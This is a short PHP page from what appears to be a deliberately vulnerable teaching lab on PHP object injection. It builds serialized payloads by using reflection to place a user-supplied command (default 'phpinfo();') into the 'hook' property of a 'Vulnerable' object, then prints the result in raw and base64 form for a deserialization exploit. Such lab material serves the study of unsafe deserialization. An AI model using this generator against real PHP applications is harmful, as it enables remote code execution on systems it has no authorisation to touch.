<html><head></head>
<body>
	<?php
	include "vulnerable.php";

	if (isset($_POST["command"]) && isset($_POST["clazz"]) && isset($_POST["property"])) {
		$reflectionClass = new ReflectionClass($_POST["clazz"]);
		$hookProperty = $reflectionClass->getProperty($_POST["property"]);		
		$hookProperty->setAccessible(true);
		$vulnerable = new Vulnerable();
		$hookProperty->setValue($vulnerable, $_POST["command"]);

		echo(serialize($vulnerable)); ?><br><br><?php	
		echo(base64_encode(serialize($vulnerable)));		
	} else { ?>
<form method="post" action="serialize_tool.php">
  Command:<br>
  <input type="text" name="command" value="phpinfo();"><br>
  Class:<br>
  <input type="text" name="clazz" value="Vulnerable"><br>
  Property:<br>
  <input type="text" name="property" value="hook"><br>
  <input type="submit" value="Submit">
</form>
<?php }; ?>

<br><br><a href="index.php"><--- Back</a>
</body>
</html>